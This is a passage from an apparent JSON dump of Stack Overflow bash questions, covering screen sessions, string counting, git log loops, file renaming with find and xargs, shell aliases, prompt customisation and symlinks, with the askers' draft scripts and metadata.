enter?</p>\n\n<p>This is a basic idea of what I would want:</p>\n\n<pre><code>+-----------------------------------------------------+\n|BLAH BLAH BLAh                                       |\n|ENTRY !                                              |\n|ERROR!                                               |\n|THINGS ARE HAPPENING                                 |\n|TONS of coMMANDS!                                    |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n|                                                     |\n+-----------------------------------------------------+\n|Unchanging entry line here.                          |\n+-----------------------------------------------------+\n</code></pre>\n"},{"tags":["bash","scripting","gnu-screen"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12681646,"title":"Scripting screen for multiple deattached windows","body":"<p>I've combed through as many of the gnu-screen and bash tags as I can find and I can't quite find the answer, so forgive me if I've missed an obvious one. </p>\n\n<p>As part of a bash script, I need to create a deattached screen session and have it run a command in the newly created window 1 of that session, then another command in the newly created window 2, all part of the same session. What I have so far successfully creates the session deattached, names it, and gets my python script running in window 1. The problem is that it will never open a second window. What am I missing?</p>\n\n<pre><code>screen -d -m -S jsession\nscreen -S jsession -p 0 -X exec /script/pyscript.py\nscreen -S jsession -p 1 -X exec asterisk -rvvvvvvvvvv\n</code></pre>\n"},{"tags":["string","bash","boolean"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12681384,"title":"String Boolean in Bash","body":"<p>I'm trying to create a script that takes two parameters: a word and a character, then returns how many times the character appears in the word.</p>\n\n<p>Here is my code: </p>\n\n<pre><code>#!/bin/bash\n((counter=0))\nfor i in $1\ndo\nif i == $2   \nthen\n((counter=counter+1))\nfi\n\necho $counter\ndone\n</code></pre>\n\n<p>My script returns 1 every time. I'm only versed in python, so my bash syntax is poor. Thanks in advance. </p>\n"},{"tags":["bash","associative-array","array-sorting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":696,"score":1,"question_id":8217049,"title":"Bash associative array sorting","body":"<p>I get the following output:</p>\n\n<pre><code>Pushkin - 100500 \nGogol - 23 \nDostoyevsky - 9999\n</code></pre>\n\n<p>Which is the result of the following script:</p>\n\n<pre><code>for k in \"${!authors[@]}\"\ndo\n    echo $k ' - ' ${authors[\"$k\"]}\ndone   \n</code></pre>\n\n<p>All I want is to get the output like this:</p>\n\n<pre><code>Pushkin - 100500 \nDostoyevsky - 9999\nGogol - 23\n</code></pre>\n\n<p>which means that the keys in associative array should be sorted by value. Is there an easy method to do so?</p>\n"},{"tags":["git","bash","mingw","pager"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":12677002,"title":"quitting git log from a bash script","body":"<p>i'm trying to write a 'live git log' bash script. \nhere's the code so far:</p>\n\n<pre><code>#!/bin/sh\nwhile true;\ndo\n    clear\n    git log --graph -10 --all --color --date=short --pretty=format:\"%Cred%x09%h %Creset%ad%Cblue%d %Creset %s %C(bold)(%an)%Creset\"\n    sleep 3\ndone\n</code></pre>\n\n<p>my problem is that git log uses a pager and you have to press <kbd>q</kbd> to quit or it will just sit there forever. is there a way to code the quit command in bash? i tried echoing q, with no luck. (i saw another post here that suggested echo \"q\" > /dev/console -- but there is no dev console in my environment)</p>\n\n<p>system: win7 box - emulating bash with mingw (1.7.6.msysget.0)</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>here's the finished script</p>\n\n<pre><code>#!/bin/sh\nwhile true;\ndo\n    clear\n    git log \\\n    --graph \\\n    --all \\\n    --color \\\n    --date=short \\\n    -40 \\\n    --pretty=format:\"%C(yellow)%h%x20%C(white)%cd%C(green)%d%C(reset)%x20%s%x20%C(bold)(%an)%Creset\" |\n    cat -\n    sleep 15\ndone\n</code></pre>\n\n<p>the -40 is a personal taste. change it to whatever number suits you and your terminal screen size.</p>\n"},{"tags":["bash","date"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12680941,"title":"Date command in Bash","body":"<p>How do I call the date +%a command in an if statement in bash? I've searched around google but can't find anything. I'm trying to create a script so that if date +%a presents Mon I echo Backup your files!</p>\n\n<p>So far I've tried this:</p>\n\n<pre><code>if [date +%a==Mon]\nthen\necho back\nfi\n</code></pre>\n\n<p>Among other variations.</p>\n\n<p>What am i missing?</p>\n\n<p>I apologize in advance if this a dumb question, I'm new to Bash. </p>\n"},{"tags":["linux","bash","command-line","find","xargs"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":122,"score":1,"question_id":12677877,"title":"Find & Xargs copy and rename via bash script","body":"<p>I have a folder with images and I need to copy them elsewhere removing special chars in the progress.\nLets say I have this</p>\n\n<pre><code>Folder1/ImageÑ%1.jpg\nFolder1/ImageÑ%1-70x70.jpg\nFolder1/ImageÑ%2.jpg\nFolder1/ImageÑ%2-70x70.jpg\nFolder1/ImageÑ%3.jpg\nFolder1/ImageÑ%3-100x100.jpg\nFolder1/ImageÑ%4.jpg\nFolder1/ImageÑ%4-100x100.jpg\n</code></pre>\n\n<p>And I want to copy just the files that doesn't have \"-70x70\" or \"-100x100\" in the name to Folder2 and be like this (without any special char):</p>\n\n<pre><code>Folder2/Image1.jpg\nFolder2/Image2.jpg\nFolder2/Image3.jpg\nFolder2/Image4.jpg\n</code></pre>\n\n<p>I've managed to copy the files, but I have no clue how to rename the files (and remove the special chars) in the same step. I think it's using SED but I can't figure out how.</p>\n\n<pre><code>find Folder1 -type f -regextype posix-extended \\( ! -regex '.+\\-[0-9]{2,4}x[0-9]{2,4}\\.jpg' \\) -print0 |  xargs -0 cp -p --target-directory=Folder2\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["bash","books"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":59,"score":-2,"question_id":8030873,"title":"Simple Bash-programs","body":"<ol>\n<li>To find user in system (user as parametr)</li>\n<li>Output of files' names, which start from a symbol. Directory and first symbol as parametrs.</li>\n<li>Script which backups directory. The name of backup should be current date.</li>\n</ol>\n\n<p>Also, would be grateful if you tell me what to read about BASH.\nCheers, \nNick</p>\n"},{"tags":["linux","bash","shell","script","command"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12676092,"title":"Linux script: Reinterpret environment variable","body":"<p>I am creating a Bash script which reads some other environment variables:</p>\n\n<pre><code>echo \"Exporting configuration variables...\"\nwhile IFS=\"=\" read -r k v; do\n    key=$k\n    value=$v\n\n    if [[ ${#key} &gt; 0 &amp;&amp; ${#value} &gt; 0 ]]; then\n        export $key=$value\n    fi\ndone &lt; $HOME/myfile\n</code></pre>\n\n<p>and have the variable:</p>\n\n<pre><code>$a=$b/c/d/e\n</code></pre>\n\n<p>and want to call <code>$a</code> as in:</p>\n\n<pre><code>cp myOtherFile $a\n</code></pre>\n\n<p>The result for the destination folder for the copy is \"$b/c/d/e\", and an error is shown:</p>\n\n<pre><code>\"$b/c/d/e\" : No such file or directory\n</code></pre>\n\n<p>because it is interpreted literally as a folder path.</p>\n\n<p>Can this path be reinterpreted before being used in the <code>cp</code> command?</p>\n"},{"tags":["bash","exec"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":959,"score":1,"question_id":8888251,"title":"understanding bash \"exec 1>&2\" command","body":"<p>I saw a bash script which had <code>exec 1&gt;&amp;2</code> command in a function. Something like:</p>\n\n<pre><code>function example()\n{\n    exec 1&gt;&amp;2\n    cat &lt;&lt;EOT\nScript requires at least one parameter.\nEOT\n    exit 1\n} \n</code></pre>\n\n<p>As I understand, <code>exec 1&gt;&amp;2</code> means that everything from this point one will be directed to <em>stderr</em>. Is this some sort of fixed behaviour of <em>exec</em> one needs to know by heart or is there some good explanation behind this? I mean as I understand, <em>exec</em> in Bash script just invokes a <strong>command</strong> taking the same PID which the Bash script had and once the <strong>command</strong> is finished, the PID is killed. <em>1>&amp;2</em> isn't a command. Could somebody explain the details(especially the <strong>why</strong> question) behind the <code>exec 1&gt;&amp;2</code> command?</p>\n"},{"tags":["bash","grep","newline"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12652568,"title":"How to give a pattern for new line in grep?","body":"<p>How to give a pattern for new line in grep?\nNew line at beginning, new line at end. Not the regular expression way. Something like \\n.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12677800,"title":"loop to move files not working","body":"<p>I am having one of these mornings where nothing goes to plan.  I need to move files to a target directory by chunks of 1,000 at time</p>\n\n<p>I wanted to loop thru my files like so</p>\n\n<pre><code>for i in `find . -name '*XML'`\n   for((b=0; b&lt;1000; b++))\n   do\n   mv $i targetdirect/\n   done\ndone\n</code></pre>\n\n<p>But I get a \"-bash: syntax error near unexpected token `done:\" error. </p>\n\n<p>What I am missing??</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12677483,"title":"perform comparison inside backticks","body":"<p>Is it possible to do something akin to the following in a bash script?:</p>\n\n<pre><code>totaltrackseval=`if [[ $totaltracks -ge 0]]; then; echo '-N $totaltracks'; else; echo 'elsetext'; fi`\n</code></pre>\n\n<p>If so, how?</p>\n"},{"tags":["bash","ssh","mirroring"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":12677704,"title":"Mirror bash shell on smartphone for Rails debugging","body":"<p>I have several shell instances active while working on a Rails app (server, vim, app root shell, etc). I would like to make use of the idle smartphone I have sitting next to my computer, that also has a good SSH client on it. Is there a way I can mirror the output of one of my local machine shells on a remote terminal so that I can quickly monitor when I hit a <code>debugger</code> line in my app?</p>\n"},{"tags":["bash","ssh"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12665327,"title":"Send a variable to a remote server with ssh","body":"<p>Im trying to do log into a file (in a remote server lets say /home/test/log.txt) what is stored in $var. Im trying with </p>\n\n<pre><code>ssh test@$192.168.1.35 \"echo \"var\" &gt;&gt; /home/test/log.txt\"\n</code></pre>\n\n<p>y also tried</p>\n\n<pre><code> ssh test@$192.168.1.35 \"echo \"$var\" &gt;&gt; log.txt\"\n</code></pre>\n\n<p>but the both didnt work</p>\n\n<p>any help?</p>\n"},{"tags":["git","bash",".bash-profile"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12676864,"title":"Adding git alias to .bash_profile not working","body":"<p>I edited my $Home .bash_profile to include some git alias commands. I am rather new to this and I can't figure out what went wrong.</p>\n\n<p><strong>.bash_profile</strong></p>\n\n<pre><code>alias gs='git status '\nalias ga='git add '\nalias gb='git branch '\nalias gc='git commit'\nalias gd='git diff'\nalias go='git checkout '\nalias gk='gitk --all&amp;'\nalias gx='gitx --all'\n\nalias got='git '\nalias get='git '\n\nPS1=\"\\u$ \"\nalias ll=\"ls -lahG\"\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; \\\n. \"$HOME/.rvm/scripts/rvm\"\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; \\\n. \"$HOME/.rvm/scripts/rvm\"\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; \\\n. \"$HOME/.rvm/scripts/rvm\"\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; \\\n. \"$HOME/.rvm/scripts/rvm\"\nexport PATH=\"/usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:$PATH\"\n\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; \\\n. \"$HOME/.rvm/scripts/rvm\"\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; \\\n. \"$HOME/.rvm/scripts/rvm\"\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; . \"$HOME/.rvm/scripts/rvm\" # Load RVM function\n</code></pre>\n\n<p>I can't seem to understand what I did wrong. Any ideas?</p>\n\n<p><strong>[EDIT]</strong> Just wanted to mention that the part that I added is from PS1 up. For example <code>alias ll = \"ls -lahG\"</code> works well. The ones above do not.</p>\n\n<p><strong>[EDIT2]</strong> I tried to user gs(){ git status \"$*\"; } instead but that didn't seem to do the trick.</p>\n\n<p><strong>[EDIT3]</strong> The problem was that I had to source ~/.profile. What I ended up doing is putting it in the ~/.bashrc file and source that file at Sputnick's recommendation. </p>\n"},{"tags":["linux","bash","if-statement","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":12676541,"title":"linux if / elif / fi command","body":"<p>I have a question.  If my <code>if</code> statement is <code>true</code>, does it skip the <code>elif</code> check and goes straight to <code>fi</code> or does it still check the <code>elif</code> statements?  </p>\n\n<p>Example of the script :</p>\n\n<pre><code>if [ argument1 || argument2 ]  \n     then  \n          do something.  \nelif [ argument2 || argument3 ]  \n     then  \n          do something.  \nelif [ argument2 || argument4 ]  \n     then  \n          do somthing.  \nelse  \n          do somthing else.  \nfi  \n</code></pre>\n\n<p>My question being that I would want my <code>elif</code> statements to still be checked if my first <code>if</code> statement was true.  I would also want my <code>elif</code> statements to be checked if my first <code>elif</code> statement was <code>true</code>... etc.  Basically I would want all my <code>if</code> and <code>elif</code> statements to all be checked.  </p>\n\n<p>NB. I realize I could change all of my <code>elif</code> to <code>if</code> statements and this would probably resolve my issue since all <code>if</code> statements would get checked.  But this question is also out of curiosity and better knowledge of the <code>if</code> and <code>elif</code> statements.</p>\n\n<p>Please let me know if you need more info.</p>\n"},{"tags":["bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3009,"score":1,"question_id":2559076,"title":"how do i redirect output to a variable in this shell function","body":"<p>i have a script like that</p>\n\n<pre><code>genhash --use-ssl -s $IP -p 443 --url $URL | grep MD5 | grep -c $MD5\n</code></pre>\n\n<p>i want to get stream generated by genhash in a variable, how do i redirect it into a variable <code>$hash</code> to compare inside a conditional</p>\n\n<pre><code>if [ $hash -ne 0 ]\n  then echo KO\n  exit 0\nelse echo -n OK\n  exit 0\nfi\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12674823,"title":"Renaming multiple files in one line of shell","body":"<h1>Problem</h1>\n\n<p>In a directory there are files of the format: *-foo-bar.txt.</p>\n\n<p>Example directory:</p>\n\n<pre><code>$ ls *-*\nasdf-foo-bar.txt  ghjk-foo-bar.txt  l-foo-bar.txt     tyui-foo-bar.txt\nbnm-foo-bar.txt   iop-foo-bar.txt   qwer-foo-bar.txt  zxcv-foo-bar.txt\n</code></pre>\n\n<p>Desired directory:</p>\n\n<pre><code>$ ls *.txt\nasdf.txt  bnm.txt  ghjk.txt  iop.txt  l.txt  qwer.txt  tyui.txt  zxcv.txt\n</code></pre>\n\n<h1>Solution 1</h1>\n\n<p>The first solution that came to my mind looks somewhat like this ugly hack:</p>\n\n<pre><code>ls *-* | cut -d- -f1 | sed 's/.*/mv \"\\0-foo-bar.txt\" \"\\0.txt\"/' &gt; rename.sh &amp;&amp; sh rename.sh\n</code></pre>\n\n<p>The above solution creates a script, on the fly, to rename the files. This solution also tries to parse the output of <code>ls</code> which is not a good thing to do as per <a href=\"http://mywiki.wooledge.org/ParsingLs\" rel=\"nofollow\">http://mywiki.wooledge.org/ParsingLs</a>.</p>\n\n<h1>Solution 2</h1>\n\n<p>This problem can be solved more elegantly with a shell script like this:</p>\n\n<pre><code>for i in *-*\ndo\n    mv \"$i\" \"`echo $i | cut -f1 -d-`.txt\"\ndone\n</code></pre>\n\n<p>The above solution uses a loop to rename the files.</p>\n\n<h1>Question</h1>\n\n<p>Is there a way to solve this problem in a single line such that we do not have to explicitly script a loop, or generate a script, or invoke a new or the current shell (i.e. avoid sh, bash, ., etc. commands)?</p>\n"},{"tags":["bash","imagemagick"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12675418,"title":"Combining pictures with timestamp","body":"<p>I have multiple pictures defined with timestamp, for instance:</p>\n\n<pre><code>face-01.jpg\nface-02.jpg\n...\nscreen-01.jpg\nscreen-02.jpg\n...\n</code></pre>\n\n<p>I need to merge the \"face\" pics with the \"screen\" ones using \"montage\" command of imagemagik. Any suggestion?</p>\n\n<pre><code>montage -mode concatenate -tile 1x face-01.jpg screen-01.jpg\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12674545,"title":".bashrc: in-script priority","body":"<p>I'm trying to do two 'advanced' things with my bash prompt.</p>\n\n<ol>\n<li>I want to show the status of my last command. I want to show my</li>\n<li>current git branch (if I'm in a git repo)</li>\n</ol>\n\n<p>I can do the two separately, and I can also do the ' then ', but I can not do ' then ' (which is what I would like).\nWhen I do try to put the  before the  the status stops working, just stays in the same state no matter what the last command's status is. /:</p>\n\n<p>I'm attaching my <code>.bashrc</code> below. As you can see, the last two line are the two possibilities. The one commented out is the one that doesn't work.</p>\n\n<p><code>.bashrc</code>:</p>\n\n<pre><code>PATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting\n\nalias sublime=\"'/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl'\"\nalias nano=\"sublime\"\nexport EDITOR=\"sublime\"\n\n\nGREEN=\"\\[\\e[32;1m\\]\"\nYELLOW=\"\\[\\e[33m\\]\"\nRED=\"\\[\\e[31m\\]\"\n\nDEFAULT=\"\\[\\e[0m\\]\"\nBRACKETS=$GREEN\nHAPPY=$YELLOW\nSAD=$RED\nBRANCH=$YELLOW\n\n\nfunction parse_git_branch () {\n       git branch 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/ (\\1)/'\n}\n\nSUCCESS_STR=\"\\`if [ \\$? = 0 ]; then echo $HAPPY^_^$DEFAULT; else echo $SAD'O_o'$DEFAULT; fi\\`\"\n\n# Nice looking bash prompt\nPS1=\"\\n$BRACKETS[$DEFAULT\\u$BRACKETS]-[$DEFAULT\\w$BRACKETS]\\n$SUCCESS_STR$BRANCH\\$(parse_git_branch) $ \"\n# PS1=\"\\n$BRACKETS[$DEFAULT\\u$BRACKETS]-[$DEFAULT\\w$BRANCH\\$(parse_git_branch)$BRACKETS]\\n$SUCCESS_STR $ \"\n</code></pre>\n"},{"tags":["bash","cygwin","rsync"],"answer_count":12,"favorite_count":15,"up_vote_count":25,"down_vote_count":0,"view_count":12377,"score":25,"question_id":105075,"title":"How can I associate .sh files with Cygwin?","body":"<p>I'd like to run a long rsync command in Cygwin by double clicking on a .sh file in Windows.  It must start in the file's containing directory (e.g. /cygdrive/c/scripts/) so that relative paths work.  Anyone gotten this to work?</p>\n\n<p>Note: I've just found <a href=\"http://blog.chavez.ws/2008/03/cygwin-command-here.html\" rel=\"nofollow\">chere</a>, a Cygwin package that manages Windows context menus (Bash Prompt Here).  It might have some clues.</p>\n"},{"tags":["bash","console","gdb","octave"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12666118,"title":"Hot to stop console to prompt the user during output?","body":"<p>I am using Kubuntu and its Konsole terminal. I have annoying behavior using different applications from console such as gdb or octave. The problem is following: the program outputs one screen of text and than stops, prompting me with double colon and waiting for me to press any key so that it can continue with the output. So if the output is big (for example 10000 iterations in octave which print some values) I have to click Enter numerous times until I get to the end of the output. I would like not to be prompt at all. I don't know if this is due to bash, Konsole application or a program in question (gdb or octave for example).</p>\n"},{"tags":["bash","symlink"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":335,"score":3,"question_id":7167424,"title":"replace all symlinks with original","body":"<p>I have the following directory structure</p>\n\n<pre><code>/symdir\n  sym1 -&gt; ../dir1\n  sym2 -&gt; ../dir2\n  hello.txt\n</code></pre>\n\n<p>And then</p>\n\n<pre><code>/dir1\n  some\n  files\n  here\n/dir2\n  more\n  files\n</code></pre>\n\n<p>I would like to replace the symlinks in symdir (sym1, sym2) with the originals.  I.e.</p>\n\n<pre><code>some_awesome_bash_func symdir symdir_output\n</code></pre>\n\n<p>Would create </p>\n\n<pre><code>/symdir_output\n  /dir1\n    some\n    files\n    here\n  /dir2\n    more\n    files\n  hello.txt\n</code></pre>\n\n<p>How would I accomplish this?</p>\n"},{"tags":["perl","bash","rt"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":250,"score":3,"question_id":12272084,"title":"How can I run a perl script from bash using command line arguments?","body":"<p>I am trying to create a script to batch mark a group of users as privileged in RT. I found a script on the RT wiki for adding users to a group and giving them the privileged status, then removed the bits of it to do with adding to a group. The perl script I have remaining is:</p>\n\n<pre><code>#!/usr/bin/perl\n# Usage: ./rt_set_privileged.pl &lt;username&gt;\n\nuse strict;\nuse lib \"/var/www/ticket.ourcompany.com/lib\";\nuse RT;\nuse RT::User;\nuse RT::Interface::CLI;\n\nRT::LoadConfig();\nRT::Init();\n\n# Create RT User Object\nmy $user = new RT::User($RT::SystemUser);\n\n# Instantiate the user object with the user passed as parameter\nmy $usertoadd = $ARGV[0];\n$user-&gt;Load( $usertoadd );\n\n# Set the privileged flag (1=privileged, 0=unprivileged)\n$user-&gt;SetPrivileged(1);\n\nexit 1\n</code></pre>\n\n<p>I have the users in a file, one username per line.\nI don't know perl as of yet, so I tried to create a little bash script to loop through the file and run the perl script once per name. The Bash script as it looks right now:</p>\n\n<pre><code>#!/bin/bash\n\ntouch commands.sh\ncat usernames.txt | while read LINE ; do\n        N=$((N+1))\n        echo /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\" &gt;&gt; commands.sh\n        /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        perl /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        perl -w /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        eval /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        perl \"/home/chris/RT/bin/rt_set_privileged.pl $LINE\"\ndone\necho \"Processed $N users\"\n</code></pre>\n\n<p>As you can see I have tried quite a few methods to get the command to run, but to no avail. The annoying thing is, I can take any of the commands from the commands.sh file afterwards and paste them straight into the terminal without a problem, this works fine. When they are run through the bash script though, I just get a bunch of these messages:</p>\n\n<pre><code>[Tue Sep  4 07:43:56 2012] [critical]: _AddMember called with a parameter that's not an integer. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:912)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value $principal in pattern match (m//) at /var/www/ticket.ourcompany.com/lib/RT/Group.pm line 970. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:968)\n[Tue Sep  4 07:43:58 2012] [error]: Group::HasMember was called with an argument that isn't an RT::Principal or id. It's (undefined) (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:973)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value $principal in pattern match (m//) at /var/www/ticket.ourcompany.com/lib/RT/Group.pm line 970. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:968)\n[Tue Sep  4 07:43:58 2012] [error]: Group::HasMember was called with an argument that isn't an RT::Principal or id. It's (undefined) (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:973)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value in concatenation (.) or string at /var/www/ticket.ourcompany.com/lib/RT/User.pm line 341. (/var/www/ticket.ourcompany.com/lib/RT/User.pm:341)\n[Tue Sep  4 07:43:58 2012] [critical]: User  is neither privileged nor unprivileged. something is drastically wrong. (/var/www/ticket.ourcompany.com/lib/RT/User.pm:341)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value $new_member in pattern match (m//) at /var/www/ticket.ourcompany.com/lib/RT/Group.pm line 911. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:911)\n</code></pre>\n\n<p>suggesting that the command is being run without any parameters.  At this point I could have actually run the command once for each user in the time I have been trying to solve it, can anyone help?</p>\n"},{"tags":["bash","shell","coffeescript"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12439762,"title":"Bash command route malfunction","body":"<p>Given this (among more...):</p>\n\n<pre><code>compile_coffee() {\n    echo \"Compile COFFEESCRIPT files...\"\n    i=0\n    for folder in ${COFFEE_FOLDER[*]}\n    do\n        for file in $folder/*.coffee\n        do\n            file_name=$(echo \"$file\" | awk -F \"/\" '{print $NF}' | awk -F \".\" '{print $1}')\n            file_destination_path=${COFFEE_DESTINATION_FOLDER[${i}]}\n            file_destination=\"$file_destination_path/$file_name.js\"\n            if [ -f $file_path ]; then\n                echo \"+ $file -&gt; $file_destination\"\n                $COFFEE_CMD $COFFEE_PARAMS $file &gt; $file_destination #FAIL\n                #$COFFEE_CMD $COFFEE_PARAMS $file &gt; testfile\n            fi\n        done\n        i=$i+1\n    done\n    echo \"done!\"\n    compress_javascript\n}\n</code></pre>\n\n<p>And just to clarify, everything except the #FAIL line works flawessly, if I'm doing something wrong just tell me, the problem I have is:</p>\n\n<ul>\n<li>the line executes and does what it have to do, but dont write the file that I put in \"file_destination\".</li>\n<li>if a delete a folder in that route (it's relative to this script, see below), bash throws and error saying that the folder do not exist.</li>\n<li>If I make the folder again, no errors, but no file either.</li>\n<li>If I change the $file_destination to \"testfile\", it create the file with correct contents.</li>\n<li>The $file_destination path its ok -as you can see, my script echoes it-</li>\n<li>if I echo the entire line, copy the exact command with params and execute it onto a shell in the same directory the script is, it\nworks.</li>\n</ul>\n\n<p>I don't know what is wrong with this, been wondering for two hours...</p>\n\n<p>Script output (real paths):</p>\n\n<pre><code>(alpha)[pyron@vps herobrine]$ ./deploy.sh compile &amp;&amp; ls -l database/static/js/\n===============================\n=== Compile ===\nCompile COFFEESCRIPT files...\n+ ./database/static/coffee/test.coffee -&gt; ./database/static/js/test.js  \ndone!\nLinking static files to django staticfiles folder... done!\ntotal 0\n</code></pre>\n\n<p>Complete command:</p>\n\n<pre><code>coffee --compile --print ./database/static/coffee/test.coffee &gt; ./database/static/js/test.js\n</code></pre>\n\n<p>What am I missing?</p>\n\n<p><strong>EDIT</strong> I've made some progression through this.\nIn the shell, If I deactivate the python virtualenv the script works, but If I call deactivate from the script it says command not found.</p>\n"},{"tags":["linux","bash","unix","script","gz"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12669133,"title":"Unzip .gz files in different folders and combine them into a single file","body":"<p>I have a few .gz files with the same name in different folders. So i want to unzip all these .gz files and combine all the output files into a single file.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12671582,"title":"Extract the minute value from the date","body":"<p>I need to extract the minute value from the Linux \"date\" command.\nThe online guides are really confusing.\nCan you help please?</p>\n"},{"tags":["osx","bash","dropbox"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12666071,"title":"How do I symlink the contents of the folder without including the actual folder?","body":"<p>I'm trying to symlink my Library/Fonts directory with a folder in my Dropbox, so that I don't have to keep installing and figuring out which machine has the fonts I need. When I try this:</p>\n\n<p><code>ln -s Fonts/ ~/Library/Fonts</code></p>\n\n<p>I get this error in return:</p>\n\n<p><code>ln: /Users/Username/Library/Fonts/: File exists</code></p>\n\n<p>I can't delete the folder because its required by the system and thus won't let you delete.</p>\n"},{"tags":["bash","unix","sed","occurences"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":567,"score":4,"question_id":10676199,"title":"UNIX: Using egrep or sed to find the line with the first occurrence of a string?","body":"<p>I'm working in a bash shell and I am trying to print only the line of the first occurrence of the string. For example, for the string '<code>auir</code>', if I have the file myfile.txt and it contains:</p>\n\n<pre><code>123\nasdf\n4wirajw\nforauir somethingelse\nstarcraft\nmylifeforauir\nauir\nsomething else\ntf.rzauir\n</code></pre>\n\n<p>I want to output \"<code>forauir somethingelse</code>\"</p>\n\n<p>So far, I use the command</p>\n\n<pre><code>sed -n '/auir/p' myfile.txt\n</code></pre>\n\n<p>which gives me all the occurrences of this string. How can I only get the first line that '<code>auir</code>' occurs on? It'd be great if it was just a single command or pipeline of commands.</p>\n\n<p>Any insight is greatly appreciated.</p>\n"},{"tags":["osx","bash","spotlight","ln"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":219,"score":2,"question_id":12169265,"title":"Bash Shell Script to search for files using mdfind","body":"<p>I have a folder of about 350 images (they are scanned recipes). To make finding them easier, I have written a search program in bash shell script. I have bash version 3.2 on Mac OS X 10.8 Mountain Lion.</p>\n\n<p>The basic idea of my program:</p>\n\n<ol>\n<li>Ask the user for search terms (using osascript).</li>\n<li>Search the file (names) for the search terms, using mdfind.</li>\n<li>Send the matching files to ln (through xargs).</li>\n<li>Make a hardlink of matching files in a \"results\" directory. This directory is contained within the same folder of images (this directory is cleaned at the beginning of the program).</li>\n</ol>\n\n<p>What the directories look like:</p>\n\n<pre><code>+Recipes\n  -files\n  -files\n  -files\n  +.search\n     -search (shell script)\n     +results\n        -links\n        -links\n</code></pre>\n\n<p>Here's my code:</p>\n\n<pre><code>#!/bin/bash\n#\n# Search program for recipes.\n# version 2\n\n# Clean out results folder\nrm -rf ~/Google\\ 